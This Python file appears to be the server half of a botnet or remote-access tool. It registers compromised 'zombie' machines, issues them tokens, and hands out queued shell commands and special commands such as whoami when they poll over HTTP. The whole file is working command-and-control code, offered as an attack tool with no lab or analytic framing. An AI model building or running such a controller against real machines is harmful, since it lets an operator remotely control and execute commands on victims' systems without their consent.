#!/usr/bin/env python3

'''
this script is for starting server for listening and other configs
'''

from http.server import BaseHTTPRequestHandler, HTTPServer
from modules.logger import Logger
from threading import Thread
from colorama import Fore
from urllib.parse import urlparse, parse_qs
from random import randint
from modules.get_modules import generate_zombie_token
import json
from datetime import datetime
from modules.terminal import Terminal
import re


serverLogger = Logger(file_name='server')
serverModule = None
terminalLogger = Logger(file_name='terminal')


class ServerModule:
    def __init__(
            self,
            lip,
            lport,
            use_https=False
    ):
        # lip : listening ip & lport: listening port
        self.lip = lip
        self.lport = lport
        self.use_https = use_https
        self.connection_status = 0 # 1 if server is started

        # zombies address = zombie_ip:zombie_id ---> e.g. 10.10.10.10:56562
        # client id == zombie address
        # [[zombie_ip:zombie_id, zombie_token, last_connection_time, {"os_info" : "OS INFO"}]]
        self.zombies_addresses_and_tokens = []

        # queued_commands list structure:
        # [[zombie_address1,command,random_command_id],
        # [zombie_address1,command2,random_command_id],
        # [zombie_address2,command,random_command_id]],
        # command id is random id for distinguishing responses from each other
        # if command starts with : #specific_command: it is a special command like:
        # #specific_command:!whoami
        self.queued_commands = []
        self.default_target = None

    def start_server(self):
        try:
            self.lport = int(self.lport)

        except ValueError:
            port_err = f'{self.lport} is Invalid Port Number'
            serverLogger.log(text=port_err, print_text=True)
            return

        try:

            self.web_server = HTTPServer((self.lip, self.lport), WebServer)

        except OverflowError:
            port_err = f'{self.lport} is Invalid Port Number'
            serverLogger.log(text=port_err, print_text=True)
            return

        except PermissionError:
            err_text = f'Permission Denied for address --> {self.lip}:{self.lport} ,' \
                       ' start the program with sudo or use ports above 1023'
            serverLogger.log(err_text, print_text=True)
            return

        except OSError as oe:
            err_text = 'OSError --> ' + str(oe)
            serverLogger.log(err_text, print_text=True)
            return

        Thread(target=self.__start_serving).start()

        self.connection_status = 1
        server_start_text = 'HTTP Server Started. ---> ({}:{})'.format(self.lip, self.lport)
        if self.use_https:
            server_start_text = server_start_text.replace('HTTP', 'HTTPS')
        serverLogger.log(text=server_start_text)

        server_start_text_col = '\nHTTP Server ' + Fore.GREEN + 'Started' + Fore.RESET +\
                                '. ---> ({}:{})'.format(self.lip, self.lport)
        if self.use_https:
            server_start_text_col = server_start_text_col.replace('HTTP', 'HTTPS')
        print(server_start_text_col)

    def __start_serving(self):
        global serverModule
        serverModule = self
        self.web_server.serve_forever()

    def stop_server(self):
        if not self.connection_status: # if server is not started
            return
        self.connection_status = 0
        self.web_server.server_close()
        print('\nServer ' + Fore.RED + 'Stopped' + Fore.RESET + '.')
        server_stop_text = 'Server Stopped.'
        serverLogger.log(text=server_stop_text)

    def queue_new_command(self, command, zombie_address, random_id):
        self.queued_commands.append([zombie_address, command, random_id])

    def send_command_from_terminal(
            self,
            command
    ):
        set_target_pattern = r'!set (.*) "(.*)"'
        command = command.lower()
        if command.startswith('!set'):
            # !set target 192.168.1.23:5656
            set_options = re.findall(set_target_pattern, command) #  [('target','192.168.1.23:5656')]
            if len(set_options) == 1:
                if set_options[0][0].strip() == 'target':
                    self.default_target = set_options[0][1].strip()
                    terminalLogger.log(text='Default target is set --> {}'.format(set_options[0][1].strip()))
                else:
                    terminalLogger.log(text='Invalid option! --> !help for Help')
            else:
                terminalLogger.log(text='Invalid option! --> !help for Help')
        else:
            terminal = Terminal(command=command, server_module=self)
            Thread(target=terminal.interpret_command).start()


class WebServer(BaseHTTPRequestHandler):
    def do_GET(self):

        request_ip = self.client_address[0]

        request_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        request_params = parse_qs(urlparse(self.path).query)

        try:
            req_type = request_params['req_type'][0]
        except KeyError:
            return

        if req_type == 'new':

            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()

            try:
                client_os = request_params['client_os'][0]
            except KeyError:
                return
            except IndexError:
                return

            zombie_address = self.generate_random_client_address(zombie_ip=request_ip)
            rand_token = generate_zombie_token()
            # add zombie to zombies list
            serverModule.zombies_addresses_and_tokens.append(
                [zombie_address, rand_token, request_time, {'os_info' : ' (OS : {}) '.format(client_os)}]
            )
            # get json for client id and token
            resp_text = self.send_back_token_and_client_id_text(client_id=zombie_address, z_token=rand_token)

            self.wfile.write(bytes(resp_text, 'UTF-8'))

            print('\nA ' + Fore.GREEN + 'zombie' + Fore.RESET +
                  ' connected ---> address-in-terminal=' + zombie_address)

        elif req_type == 'get-signal':
            # check token and client id
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()

            try:
                client_address = request_params['client_id'][0]
                client_req_token = request_params['token'][0]

            except KeyError:
                return
            except IndexError:
                return

            temp_zombies_addr_and_token_list =[] # [zombie_address1, token1, zombie_address2, token2]
            for zc in serverModule.zombies_addresses_and_tokens:
                temp_zombies_addr_and_token_list.append(zc[0])
                temp_zombies_addr_and_token_list.append(zc[1])

            if client_address not in temp_zombies_addr_and_token_list: # if client is not in the list of clients send reset msg
                resp_text = self.send_reset_resp()
                self.wfile.write(bytes(resp_text,'UTF-8'))
                return

            token_index_in_temp_list = temp_zombies_addr_and_token_list.index(client_address) + 1
            client_original_token = temp_zombies_addr_and_token_list[token_index_in_temp_list]

            if client_original_token != client_req_token: # if the token is not correct send bad token msg
                resp_text = self.send_bad_token_resp()
                self.wfile.write(bytes(resp_text,'UTF-8'))
                return

            zombie_address_index = int((token_index_in_temp_list - 1) / 2)
            # renew last connection time in original list
            serverModule.zombies_addresses_and_tokens[zombie_address_index][2] = request_time

            if not serverModule.queued_commands: # if there is no command to execute on client, return
                resp_text = self.send_no_command_resp()
                self.wfile.write(bytes(resp_text, 'UTF-8'))
                return

            temp_list_command_address_and_command = []
            # zac --> is list of [zombie address, command, command id]
            for zac in serverModule.queued_commands:
                for zi in zac:
                    temp_list_command_address_and_command.append(zi)

            if client_address not in temp_list_command_address_and_command: # if there is no command for the client return
                resp_text = self.send_no_command_resp()
                self.wfile.write(bytes(resp_text,'UTF-8'))
                return

            # send command if there is command for zombie
            __command_index_in_list = temp_list_command_address_and_command.index(client_address) + 1
            __command = temp_list_command_address_and_command[__command_index_in_list]
            __command_id = temp_list_command_address_and_command[__command_index_in_list + 1]

            terminalLogger.log(
                'Zombie {} Sent Get Request ---> Command : ({}) '
                'with Command ID : ({}) Sent.'
                    .format(client_address, __command_id, __command_id)
            )

            # if command starts with : #special_command:!   it is a special command like:
            # #special_command:!whoami
            if __command.startswith('#special_command:!'):
                special_cmd = __command.split('!')[1]
                resp_text = self.send_specific_command(special_cmd=special_cmd, cmd_id=__command_id)
                self.wfile.write(bytes(resp_text, 'UTF-8'))
            else:
                resp_text = self.send_command_back(command=__command, cmd_id=__command_id)
                self.wfile.write(bytes(resp_text, 'UTF-8'))
            # remove queued command after sending it to zombie
            serverModule.queued_commands.remove([client_address, __command, __command_id])

            return

        else:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

    def log_message(self, format, *args):
        pass

    def generate_random_client_address(self, zombie_ip):

        '''
        generate a random id for client
        if the id is repeated it generates new one
        '''

        while True:
            random_id = str(randint(1,9999))
            temp_address = f'{zombie_ip}:{random_id}'
            temp_address_list = []
            for zc in serverModule.zombies_addresses_and_tokens:
                temp_address_list.append(zc[0]) # zc[0] is zombie's address

            if temp_address not in temp_address_list:
                return temp_address

    def send_back_token_and_client_id_text(self, client_id, z_token):
        # client id == zombie address
        json_string = json.dumps({'client_id' : client_id, 'token' : z_token})
        return json_string

    def send_reset_resp(self):
        # send 'reset' signal to reset connection and get new client id
        json_string = json.dumps({'resp_type' : 'reset'})
        return json_string

    def send_bad_token_resp(self):
        # send bad_token signal when the token is not correct
        json_string = json.dumps({'resp_type' : 'bad_token'})
        return json_string

    def send_no_command_resp(self):
        # send no_cmd signal when there is no command to execute
        json_string = json.dumps({'resp_type' : 'no_cmd'})
        return json_string

    def send_command_back(self, command, cmd_id):
        # send command back to execute on client
        # cmd_id is command id
        resp_structure = {
            'resp_type' : 'run_cmd',
            'cmd' : command,
            'cmd_id' : cmd_id
        }
        json_string = json.dumps(resp_structure)
        return json_string

    def send_specific_command(self, special_cmd, cmd_id):
        # send predefined command back to execute on client like !software or !whoami
        # cmd_id is command id
        resp_structure = {
            'resp_type' : 'special_cmd',
            's_cmd' : special_cmd,
            'cmd_id' : cmd_id
        }
        json_string = json.dumps(resp_structure)
        return json_string